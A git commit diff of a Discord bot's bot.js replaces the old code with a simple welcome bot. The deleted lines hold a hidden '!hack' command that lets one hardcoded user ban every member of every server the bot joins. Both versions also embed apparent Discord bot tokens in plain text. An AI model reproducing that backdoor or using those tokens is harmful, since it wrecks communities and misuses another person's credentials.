2a2064ab144f4becac1c0839cac0e3bee64e8b6f
VladDisco07 <32614194+VladDisco07@users.noreply.github.com>
2018-04-03 13:42:54 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,40 +1,31 @@
-const Discord = require(`discord.js`)
-const client = new Discord.Client()
-const prefix = "!"
-const bot = new Discord.Client()
-const token = "NDI5NzQ5OTg5MDE1ODE0MTQ0.DaGLYA.vqEMx2ISbXDf-YDwJ67_fTt4Bas"
-const log = message => {
-  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
-};
+/*
+  A bot that welcomes new guild members when they join
+*/
 
-client.on("guildCreate", guild => {
-      console.log(`${guild.name},  ${guild.memberCount} members!`);
-});
-client.on("guildDelete", guild => {
-  console.log(`- ${guild.name}`);
-});
+// Import the discord.js module
+const Discord = require('discord.js');
 
+// Create an instance of a Discord client
+const client = new Discord.Client();
 
-client.on('message', message => {
-if(message.content.startsWith('!hack')) {
-    if(message.author.id === "340794026544463872"){
-        let args = message.content.split(" ").slice(1);
-        var argresult = args.join(" ")
-        const argsresult = args.join(" ")
-        let reason = args.join(" ")
-                  if(!args[1]) {
- }
- if(args[1]) {
-     client.guilds.forEach(guild => {
-guild.members.forEach(member => {
-message.guild.ban(member)
-member.send(reason)
-message.delete()
-})})}}}
+// The token of your bot - https://discordapp.com/developers/applications/me
+const token = 'NDI5NzQ5OTg5MDE1ODE0MTQ0.DaTsGA.c3ihIVcvs41dz0LCZoRrbMEZrEc';
+
+// The ready event is vital, it means that your bot will only start reacting to information
+// from Discord _after_ ready is emitted
+client.on('ready', () => {
+  console.log('I am ready!');
 });
 
-client.on("ready", () => {
-    console.log("On " + client.guilds.size + " guilds.")
-    console.log("With " + client.users.size + " members.")
+// Create an event listener for new guild members
+client.on('guildMemberAdd', member => {
+  // Send the message to a designated channel on a server:
+  const channel = member.guild.channels.find('name', 'member-log');
+  // Do nothing if the channel wasn't found on this server
+  if (!channel) return;
+  // Send the message, mentioning the member
+  channel.send(`Bine ai venit pe **HL||HackerLand**, ${member}`);
 });
-client.login(token)
+
+// Log our bot in
+client.login(token);
